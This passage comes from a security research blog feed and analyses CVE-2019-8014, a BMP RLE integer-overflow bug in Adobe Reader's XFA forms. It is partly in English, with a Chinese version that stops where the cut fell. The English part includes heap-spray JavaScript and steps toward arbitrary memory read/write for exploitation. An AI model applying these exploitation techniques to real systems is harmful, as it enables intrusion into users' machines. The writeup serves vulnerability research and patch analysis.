data)</span><br><span class="line">304c8488  10101010 10101010</span><br><span class="line">; bitmap data begins here</span><br><span class="line">304c8490                    00000000 00000000</span><br></pre></td></tr></table></figure><p>Now the <code>byteLength</code> of the <code>ArrayBuffer</code> object has been changed to <code>0x10101010</code> and we can achieve Out-Of-Bounds access now. So far so good? The fact is that the process will crash immediately since we also changed the <code>DataView</code> pointer.</p><h4 id="5-5-2-Memory-Layout-0"><a href="#5-5-2-Memory-Layout-0" class="headerlink" title="5.5.2 Memory Layout (0)"></a>5.5.2 Memory Layout (0)</h4><p>We can avoid the crash if we can make <code>0x10101010</code> acts like a valid pointer. Obviously, we should arrange the memory layout before triggering the vulnerability. To make it more stable, it should be done even before we create and free the <code>ArrayBuffer</code> objects.</p><p>We need the ability to put any value at any memory address, such as <code>0x10101010</code> . To achieve this goal, we can create lots of <code>ArrayBuffer</code> objects with <code>byteLength</code> setting to <code>0xFFE8</code> . That’s a carefully selected size to make sure that the <code>ArrayBuffer</code> objects will be allocated at predictable addresses.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0xFFE8 -&gt; byteLength</span></span><br><span class="line"><span class="comment">// 0x10 -&gt; sizeof ObjectElements</span></span><br><span class="line"><span class="comment">// 0x08 -&gt; sizeof heap block's metadata</span></span><br><span class="line"><span class="number">0xFFE8</span> + <span class="number">0x10</span> + <span class="number">0x08</span> = <span class="number">0x10000</span></span><br></pre></td></tr></table></figure><p>I’m not going to discuss how to avoid the crash in details, it’s very easy to figure out the specific conditions. Following code can be used to avoid the crash.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillHeap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x1200</span>);</span><br><span class="line">    array[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xFFE8</span>);</span><br><span class="line">    <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(array[<span class="number">0</span>]);</span><br><span class="line">    </span><br><span class="line">    dv.setUint32(<span class="number">0xFB8</span>, <span class="number">0x10100058</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0</span>, <span class="number">0x10100158</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0xFFA8</span>, <span class="number">0x10100258</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0x200</span> + <span class="number">0x14</span>, <span class="number">0x10100358</span>, <span class="literal">true</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &amp;lt; array.length; ++i) &#123;</span><br><span class="line">        array[i] = array[<span class="number">0</span>].slice();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>It’s not done yet. The process still crashes when we try to create a new <code>DataView</code> object for it. We can avoid the crash using the same tricks. Following is the improved code.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillHeap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x1200</span>);</span><br><span class="line">    array[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xFFE8</span>);</span><br><span class="line">    <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(array[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">// avoid crash when triggering the vulnerability</span></span><br><span class="line">    dv.setUint32(<span class="number">0xFB8</span>, <span class="number">0x10100058</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0</span>, <span class="number">0x10100158</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0xFFA8</span>, <span class="number">0x10100258</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0x200</span> + <span class="number">0x14</span>, <span class="number">0x10100358</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// avoid crash when creating new DataView objects</span></span><br><span class="line">    dv.setUint32(<span class="number">0xFFA4</span>, <span class="number">0x10100458</span>, <span class="literal">true</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &amp;lt; array.length; ++i) &#123;</span><br><span class="line">        array[i] = array[<span class="number">0</span>].slice();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5-5-3-Global-Read-Write"><a href="#5-5-3-Global-Read-Write" class="headerlink" title="5.5.3 Global Read / Write"></a>5.5.3 Global Read / Write</h4><p>Once we overwrote the <code>byteLength</code> of any <code>ArrayBuffer</code> object with <code>0x10101010</code> , we can leverage this <code>ArrayBuffer</code> object to overwrite next one’s <code>byteLength</code> to <code>0xFFFFFFFF</code> . It’s very easy to search the next <code>ArrayBuffer</code> object if we put a flag value within all the <code>ArrayBuffer</code> objects.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  (1)byteLength            (3)Global Access</span><br><span class="line"> ┌─&lt;───&lt;───&lt;───┐            &lt;──────┬──────&gt;</span><br><span class="line">┌┼────────────┬┼────────────┬──────┼──────┬─────────────┐</span><br><span class="line">│ ArrayBuffer │ Bitmap Data │ ArrayBuffer │     Hole    │</span><br><span class="line">└──────┼──────┴─────────────┴┼────────────┴─────────────┘</span><br><span class="line">       └──&gt;───&gt;───&gt;───&gt;────&gt;─┘</span><br><span class="line">        (2) byteLength to -1</span><br></pre></td></tr></table></figure><p>Now we have the ability to read and write any memory address within the user space.</p><h4 id="5-5-4-Absolute-Address-Access"><a href="#5-5-4-Absolute-Address-Access" class="headerlink" title="5.5.4 Absolute Address Access"></a>5.5.4 Absolute Address Access</h4><p>Once we have the global access ability, we can <strong>search backward</strong> to calculate the base address of the <code>ArrayBuffer</code> object’s backing store buffer, thus we can read and write at any given absolute memory address.</p><p>We can search two flags, <code>ffeeffee</code> or <code>f0e0d0c0</code> , to calculate the base address. To make it more accurate, the bytes around the flag value also need to be verified.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; dd 30080000</span><br><span class="line">30080000  16b80e9e 0101331b ffeeffee 00000002  ; ffeeffee</span><br><span class="line">30080010  055a00a4 2f0b0010 055a0000 30080000  ; +0x14 -&gt; 30080000</span><br><span class="line">30080020  00000fcf 30080040 3104f000 000002e5</span><br><span class="line">30080030  00000001 00000000 30d69ff0 30d69ff0</span><br><span class="line">30080040  3eb82e96 08013313 00000000 0000ffe8</span><br><span class="line">30080050  00000000 00000000 10100158 00000000</span><br><span class="line">30080060  00000000 00000000 00000000 00000000</span><br><span class="line">30080070  00000000 00000000 00000000 00000000</span><br><span class="line"></span><br><span class="line">0:014&gt; dd 305f4000</span><br><span class="line">305f4000  00000000 00000000 6ab08d69 0858b71a</span><br><span class="line">305f4010  0bbab388 30330080 0ff00112 f0e0d0c0  ; f0e0d0c0</span><br><span class="line">305f4020  15dc2c3f 00000430 305f402c d13bc929  ; +0x0C -&gt; 305f402c</span><br><span class="line">305f4030  e5c521a7 d9b264d4 919cee58 45da954e</span><br><span class="line">305f4040  5c3f608b 2b5fd340 0bae3aa9 2b5fd340</span><br><span class="line">305f4050  0fae32aa d13bc929 e5c521a7 d9b264d4</span><br><span class="line">305f4060  919cee58 45da954e 9c3f608b f952aa94</span><br><span class="line">305f4070  989c772a a1dd934a ac5b154b 2fadd038</span><br></pre></td></tr></table></figure><h4 id="5-5-5-Remaining-Steps"><a href="#5-5-5-Remaining-Steps" class="headerlink" title="5.5.5 Remaining Steps"></a>5.5.5 Remaining Steps</h4><p>Once we can read and write at any given absolute memory address, it’s very easy to achieve code execution. Following are the remaining steps that will not be discussed in this post:</p><ul><li>EIP hijack</li><li>ASLR bypass</li><li>DEP bypass</li><li>CFG bypass</li></ul><h2 id="0x06-CVE-2013-2729"><a href="#0x06-CVE-2013-2729" class="headerlink" title="0x06. CVE-2013-2729"></a>0x06. CVE-2013-2729</h2><p>Three integer overflows were found within the handling of RLE compressed data, one in RLE8 decompression and the other two in RLE4 decompression.</p><p>Why shouldn’t we found four? Because another one have been patched six years ago. You can read <a href="http://blog.binamuse.com/2013/05/readerbmprle.html" target="_blank" rel="noopener">feliam’s write up for CVE-2013-2729</a> if you haven’t read it yet.</p><p>Also, the patch for CVE-2013-2729 can be found within the handling of RLE8 compressed data.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dst_xpos = BYTE1(cmd) + xpos;</span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &lt; xpos || </span><br><span class="line">     dst_xpos &lt; BYTE1(cmd) || dst_xpos &gt; width )  <span class="comment">// overflow check</span></span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;         <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure><p>It’s astonishing that Adobe only patched the case that was reported and ignored the other three.</p><h2 id="0x07-Lessons-Learned"><a href="#0x07-Lessons-Learned" class="headerlink" title="0x07. Lessons Learned"></a>0x07. Lessons Learned</h2><p>For product developers, please try to understand the root cause of the vulnerability and eliminate similar ones as much as you can.</p><p>For security researchers, patch analysis is a good way to figure out what the developers were thinking, and maybe you can find bypass solutions (this happens sometimes).</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;em&gt;This post provides detailed analysis for CVE-2019-8014 which was fixed in Adobe Acrobat Reader / Pro DC recently. Interestingly, it’s a patch bypass of CVE-2013-2729 which was &lt;del&gt;&lt;strong&gt;fixed&lt;/strong&gt;&lt;/del&gt; six years ago. This post also discusses how to exploit the vulnerability.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Author: &lt;strong&gt;Ke Liu of Tencent Security Xuanwu Lab&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="http://programlife.net/categories/Vulnerability/"/>
    
      <category term="Analysis" scheme="http://programlife.net/categories/Vulnerability/Analysis/"/>
    
    
      <category term="Adobe Reader" scheme="http://programlife.net/tags/Adobe-Reader/"/>
    
      <category term="PDF" scheme="http://programlife.net/tags/PDF/"/>
    
      <category term="CVE-2019-8014" scheme="http://programlife.net/tags/CVE-2019-8014/"/>
    
      <category term="CVE-2013-2729" scheme="http://programlife.net/tags/CVE-2013-2729/"/>
    
      <category term="XFA" scheme="http://programlife.net/tags/XFA/"/>
    
      <category term="BMP" scheme="http://programlife.net/tags/BMP/"/>
    
      <category term="RLE" scheme="http://programlife.net/tags/RLE/"/>
    
  </entry>
  
  <entry>
    <title>深入分析 Adobe 忽略了 6 年的 PDF 漏洞</title>
    <link href="http://programlife.net/2019/09/12/deep-analysis-of-cve-2019-8014-cn/"/>
    <id>http://programlife.net/2019/09/12/deep-analysis-of-cve-2019-8014-cn/</id>
    <published>2019-09-12T00:13:37.000Z</published>
    <updated>2020-05-20T14:36:09.000Z</updated>
    
    <content type="html"><![CDATA[<p><em>本文详细分析了 Adobe Acrobat Reader / Pro DC 中近期修复的安全漏洞 CVE-2019-8014 。有趣的是，Adobe 在六年前 <strong><del>修复</del></strong> 了一个类似的漏洞 CVE-2013-2729 ，正是由于对该漏洞的修复不够完善，才使得 CVE-2019-8014 遗留了长达六年之久。本文同时讨论了如何为此类漏洞编写利用代码。</em></p><p>本文作者：<strong>Ke Liu of Tencent Security Xuanwu Lab</strong></p><a id="more"></a><h2 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01. 漏洞简介"></a>0x01. 漏洞简介</h2><p>Adobe 在八月份为 Adobe Acrobat and Reader 发布了安全公告 <a href="https://helpx.adobe.com/security/products/acrobat/apsb19-41.html" target="_blank" rel="noopener">APSB19-41</a> ，和往常一样，这次更新修复了大量漏洞。当笔者在 <a href="https://www.zerodayinitiative.com/advisories/published/" target="_blank" rel="noopener">ZDI</a> 上查看对应的漏洞公告时，目光迅速被 <a href="https://www.zerodayinitiative.com/advisories/ZDI-19-725/" target="_blank" rel="noopener">ZDI-19-725</a> / <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8014" target="_blank" rel="noopener">CVE-2019-8014</a> 所吸引，因为模块 <code>AcroForm</code> 中 Bitmap 解析相关的漏洞非常少见。该漏洞在 ZDI 上的部分公告信息如下：</p><blockquote><p>Adobe Acrobat Pro DC AcroForm Bitmap File Parsing Heap-based Buffer Overflow Remote Code Execution Vulnerability</p><p>The specific flaw exists within the parsing of run length encoding in BMP images. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a fixed-length, heap-based buffer. An attacker can leverage this vulnerability to execute code in the context of the current process.</p></blockquote><p>看描述这和六年之前修复的漏洞 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2729" target="_blank" rel="noopener">CVE-2013-2729</a> 非常相似——都和 <strong>XFA Bitmap Run Length Encoding</strong> 解析有关！实际上，两个漏洞之间确实有着千丝万缕的联系，本文将详细分析漏洞的原理以及两者之间的关系。</p><p>漏洞 CVE-2019-8014 在 ZDI 上的致谢信息为 <code>ktkitty (https://ktkitty.github.io)</code> 。</p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02. 环境搭建"></a>0x02. 环境搭建</h2><p>根据官方公告 <a href="https://helpx.adobe.com/security/products/acrobat/apsb19-41.html" target="_blank" rel="noopener">APSB19-41</a> 的描述，该漏洞影响 <code>2019.012.20035</code> 以及更早版本的 Adobe Acrobat and Reader ，而不受影响的最新版本号为 <code>2019.012.20036</code> 。本文基于前者进行漏洞分析、基于后者进行补丁分析。</p><p>安装 Adobe Acrobat Reader DC <code>2019.012.20035</code> 的步骤如下：</p><ol><li>下载并安装 <code>2019.012.20034</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220034/" target="_blank" rel="noopener">下载链接</a>)</li><li>升级到 <code>2019.012.20035</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220035/" target="_blank" rel="noopener">下载链接</a>)</li></ol><p>安装 Adobe Acrobat Reader DC <code>2019.012.20036</code> 的步骤如下：</p><ol><li>下载并安装 <code>2019.012.20036</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220036/" target="_blank" rel="noopener">下载链接</a>)</li></ol><p>在调试环境中安装好软件后，记得禁用更新服务 <em>Adobe Acrobat Update Service</em> 或者直接断开网络连接，防止 Adobe Acrobat Reader DC 自动更新。</p><h2 id="0x03-位图简介"><a href="#0x03-位图简介" class="headerlink" title="0x03. 位图简介"></a>0x03. 位图简介</h2><p>在进行漏洞分析之前，先简单介绍一下位图的结构。如果你对位图已经非常熟悉，那么可以直接跳过本小节内容。</p><h3 id="3-1-相关结构"><a href="#3-1-相关结构" class="headerlink" title="3.1 相关结构"></a>3.1 相关结构</h3><p>通常来说，位图文件由以下四部分构成：</p><ol><li>Bitmap File Header</li><li>Bitmap Info Header</li><li>RGBQUAD Array</li><li>Bitmap Data</li></ol><h4 id="3-1-1-Bitmap-File-Header"><a href="#3-1-1-Bitmap-File-Header" class="headerlink" title="3.1.1 Bitmap File Header"></a>3.1.1 Bitmap File Header</h4><p>结构体 <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/ns-wingdi-bitmapfileheader" target="_blank" rel="noopener">BITMAPFILEHEADER</a></strong> 的定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPFILEHEADER</span> &#123;</span></span><br><span class="line">  WORD  bfType;         <span class="comment">// 文件标记 'BM'</span></span><br><span class="line">  DWORD bfSize;         <span class="comment">// 位图文件的大小</span></span><br><span class="line">  WORD  bfReserved1;    <span class="comment">// 保留字段 0</span></span><br><span class="line">  WORD  bfReserved2;    <span class="comment">// 保留字段 0</span></span><br><span class="line">  DWORD bfOffBits;      <span class="comment">// 位图数据在文件中的偏移值</span></span><br><span class="line">&#125; BITMAPFILEHEADER, *LPBITMAPFILEHEADER, *PBITMAPFILEHEADER;</span><br></pre></td></tr></table></figure><h4 id="3-1-2-Bitmap-Info-Header"><a href="#3-1-2-Bitmap-Info-Header" class="headerlink" title="3.1.2 Bitmap Info Header"></a>3.1.2 Bitmap Info Header</h4><p>结构体 <strong><a href="https://docs.microsoft.com/en-us/previous-versions/dd183376(v=vs.85" target="_blank" rel="noopener">BITMAPINFOHEADER</a>)</strong> 的定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPINFOHEADER</span> &#123;</span></span><br><span class="line">  DWORD biSize;             <span class="comment">// 结构体的大小</span></span><br><span class="line">  LONG  biWidth;            <span class="comment">// 位图宽度</span></span><br><span class="line">  LONG  biHeight;           <span class="comment">// 位图高度</span></span><br><span class="line">  WORD  biPlanes;           <span class="comment">// 必须为 1</span></span><br><span class="line">  WORD  biBitCount;         <span class="comment">// 每个像素所占用的位数</span></span><br><span class="line">  DWORD biCompression;      <span class="comment">// 压缩算法</span></span><br><span class="line">  DWORD biSizeImage;        <span class="comment">// 数据大小</span></span><br><span class="line">  LONG  biXPelsPerMeter;    <span class="comment">// 水平分辨率</span></span><br><span class="line">  LONG  biYPelsPerMeter;    <span class="comment">// 垂直分辨率</span></span><br><span class="line">  DWORD biClrUsed;          <span class="comment">// 色彩索引数</span></span><br><span class="line">  DWORD biClrImportant;     <span class="comment">// 必须的色彩索引数</span></span><br><span class="line">&#125; BITMAPINFOHEADER, *PBITMAPINFOHEADER;</span><br></pre></td></tr></table></figure><p>这里成员 <code>biCompression</code> 指明了位图所使用的压缩算法，部分压缩算法的定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RGB  0  <span class="comment">// 未使用压缩算法</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RLE8 1  <span class="comment">// RLE8 压缩算法</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RLE4 2  <span class="comment">// RLE4 压缩算法</span></span></span><br><span class="line"><span class="comment">// 其他压缩算法...</span></span><br></pre></td></tr></table></figure><h4 id="3-1-3-RGBQUAD-Array"><a href="#3-1-3-RGBQUAD-Array" class="headerlink" title="3.1.3 RGBQUAD Array"></a>3.1.3 RGBQUAD Array</h4><p>结构体 <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/ns-wingdi-rgbquad" target="_blank" rel="noopener">RGBQUAD</a></strong> 描述一个像素的色彩组成，其定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagRGBQUAD</span> &#123;</span></span><br><span class="line">  BYTE rgbBlue;</span><br><span class="line">  BYTE rgbGreen;</span><br><span class="line">  BYTE rgbRed;</span><br><span class="line">  BYTE rgbReserved;</span><br><span class="line">&#125; RGBQUAD;</span><br></pre></td></tr></table></figure><p><strong>RGBQUAD Array</strong> 代表了一张色彩表，位图数据在解析之后可以是一个索引，索引在数组中对应的值便是该像素的色彩表示。该数组的长度取决于结构体 <strong>BITMAPINFOHEADER</strong> 中的 <code>biBitCount</code> 和 <code>biClrUsed</code> 成员的值。</p><h4 id="3-1-4-Bitmap-Data"><a href="#3-1-4-Bitmap-Data" class="headerlink" title="3.1.4 Bitmap Data"></a>3.1.4 Bitmap Data</h4><p>位图的位数据，该部分数据的表现形式取决于位图所使用的压缩算法。</p><p>有一点需要注意的是：位图数据是从左下角往右上角方向进行填充的，即位图数据中解析出来的第一个像素的色彩，应当填充到位图的左下角 [<a href="https://en.wikipedia.org/wiki/BMP_file_format#Pixel_array_(bitmap_data" target="_blank" rel="noopener">wikipedia</a>)]，随后依次填充当前行的像素，当前行填充完毕之后，往上移动一个像素继续以行位单位进行填充，直到位图填充完毕。</p><h3 id="3-2-RLE-编码"><a href="#3-2-RLE-编码" class="headerlink" title="3.2 RLE 编码"></a>3.2 RLE 编码</h3><p>位图支持两种类型的 RLE（<strong>Run Length Encoding</strong>）压缩算法：<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/73b57f24-6d78-4eeb-9c06-8f892d88f1ab" target="_blank" rel="noopener">RLE4</a> 和 <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/b64d0c0b-bb80-4b53-8382-f38f264eb685" target="_blank" rel="noopener">RLE8</a> 。</p><h4 id="3-2-1-RLE8-编码"><a href="#3-2-1-RLE8-编码" class="headerlink" title="3.2.1 RLE8 编码"></a>3.2.1 RLE8 编码</h4><p>RLE8 压缩算法用于压缩 8 位位图（即每个像素占用 1 字节空间）。RLE8 压缩后的数据可以处于 <strong>编码模式（Encoded Mode）</strong> 和 <strong>绝对模式（Absolute Mode）</strong> 中的任意一种（两种模式在同一个位图中可以同时出现）。</p><p><strong>编码模式</strong> 包含两字节数据：</p><ul><li>如果第一个字节不为零，其含义为第二个字节需要重复的次数</li><li>如果第一个字节为零，那么第二个字节的可能含义如下<ul><li>0x00 表示当前行已经结束</li><li>0x01 表示位图解析完毕</li><li>0x02 表示接下来的两个字节 <code>(deltaX, deltaY)</code> 为当前坐标 <code>(x, y)</code> 需要移动的距离</li></ul></li></ul><p>在 <strong>绝对模式</strong> 中，第一个字节为零，第二个字节位于区间 <code>[0x03, 0xFF]</code> 。第二个字节表示接下来特定数量的字节是未压缩的数据（数据量需要按 <code>WORD</code> 对齐）。</p><p>下面为 RLE8 压缩之后的数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[03 04] [05 06] [00 03 45 56 67] [02 78] [00 02 05 01]</span><br><span class="line">[02 78] [00 00] [09 1E] [00 01]</span><br></pre></td></tr></table></figure><p>下面为解压之后的数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">04 04 04</span><br><span class="line">06 06 06 06 06</span><br><span class="line">45 56 67</span><br><span class="line">78 78</span><br><span class="line">move current position 5 right and 1 up</span><br><span class="line">78 78</span><br><span class="line">end of line</span><br><span class="line">1E 1E 1E 1E 1E 1E 1E 1E 1E</span><br><span class="line">end of RLE bitmap</span><br></pre></td></tr></table></figure><h4 id="3-2-2-RLE4-编码"><a href="#3-2-2-RLE4-编码" class="headerlink" title="3.2.2 RLE4 编码"></a>3.2.2 RLE4 编码</h4><p>RLE4 压缩算法用于压缩 4 位位图（即每个像素占用半字节空间）。RLE4 压缩后的数据可以处于 <strong>编码模式（Encoded Mode）</strong> 和 <strong>绝对模式（Absolute Mode）</strong> 中的任意一种（两种模式在同一个位图中可以同时出现）。</p><p><strong>编码模式</strong> 包含两字节数据：</p><ul><li><p>如果第一个字节不为零，其含义为第二个字节展开后得到的像素个数</p><ul><li>第二个字节代表了两个像素的色彩索引</li><li>高 4 位代表第一个像素的色彩索引</li><li>低 4 位代表第二个像素的色彩索引</li><li>二者依次交替重复，直到得到第一个字节指定的像素个数</li></ul></li><li><p>如果第一个字节为零，那么第二个字节的可能含义如下</p><ul><li>0x00 表示当前行已经结束</li><li>0x01 表示位图解析完毕</li><li>0x02 表示接下来的两个字节 <code>(deltaX, deltaY)</code> 为当前坐标 <code>(x, y)</code> 需要移动的距离</li></ul></li></ul><p>在 <strong>绝对模式</strong> 中，第一个字节为零，第二个字节位于区间 <code>[0x03, 0xFF]</code> 。第二个字节表示接下来特定数量的 <strong>半字节</strong> 是未压缩的数据（数据量需要按 <code>WORD</code> 对齐）。</p><p>下面为 RLE4 压缩之后的数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[03 04] [05 06] [00 06 45 56 67 00] [04 78] [00 02 05 01]</span><br><span class="line">[04 78] [00 00] [09 1E] [00 01]</span><br></pre></td></tr></table></figure><p>下面为解压之后的数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0 4 0</span><br><span class="line">0 6 0 6 0</span><br><span class="line">4 5 5 6 6 7</span><br><span class="line">7 8 7 8</span><br><span class="line">move current position 5 right and 1 up</span><br><span class="line">7 8 7 8</span><br><span class="line">end of line</span><br><span class="line">1 E 1 E 1 E 1 E 1</span><br><span class="line">end of RLE bitmap</span><br></pre></td></tr></table></figure><h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04. 漏洞分析"></a>0x04. 漏洞分析</h2><h3 id="4-1-代码定位"><a href="#4-1-代码定位" class="headerlink" title="4.1 代码定位"></a>4.1 代码定位</h3><p>根据 ZDI 网站上的公告信息，可知漏洞位于 <strong>AcroForm</strong> 模块。该模块是 Adobe Acrobat Reader DC 中负责处理 <a href="https://en.wikipedia.org/wiki/XFA" target="_blank" rel="noopener">XFA 表单</a> 的插件，其路径如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%PROGRAMFILES(X86)%\Adobe\Acrobat Reader DC\Reader\plug_ins\AcroForm.api</span><br></pre></td></tr></table></figure><p>通常来说，借助 <a href="https://www.zynamics.com/bindiff.html" target="_blank" rel="noopener">BinDiff</a> 进行补丁对比分析可以快速定位到有漏洞的函数，但如果新旧版本的二进制文件变动比较大的话就不太好处理了，模块 <code>AcroForm.api</code> 的情况便是如此：通过对比发现有大量函数进行了改动，一个一个去看显然不太现实。</p><p>笔者用于定位漏洞函数的方法如下（以 <code>2019.012.20035</code> 为例）：</p><ol><li>在 <code>IDA</code> 中搜索字符串 <code>PNG</code> ，在 <code>.rdata:20F9A374</code> 找到一处定义</li><li>对 <code>20F9A374</code> 进行交叉引用查找，定位到函数 <code>sub_20CF3A3F</code> </li><li>很显然函数 <code>sub_20CF3A3F</code> 负责判断图片的类型（从这里也可以看出 XFA 表单所支持的图片格式类型）</li><li>对 <code>sub_20CF3A3F</code> 进行交叉引用查找，定位到函数 <code>sub_20CF4BE8</code> </li><li>函数 <code>sub_20CF4BE8</code> 根据图片的类型调用不同的处理函数</li><li>函数 <code>sub_20CF4870</code>（跳转自 <code>sub_20CF3E5F</code>）负责处理 <code>BMP</code> 位图</li></ol><p>在 BinDiff 的结果中可以看到，函数 <code>sub_20CF3E5F</code> 中确实有几个基本块发生了变动，比如 <code>20CF440F</code> 处的基本块的变动情况如下：</p><figure class="highlight c++"><table><tr><td 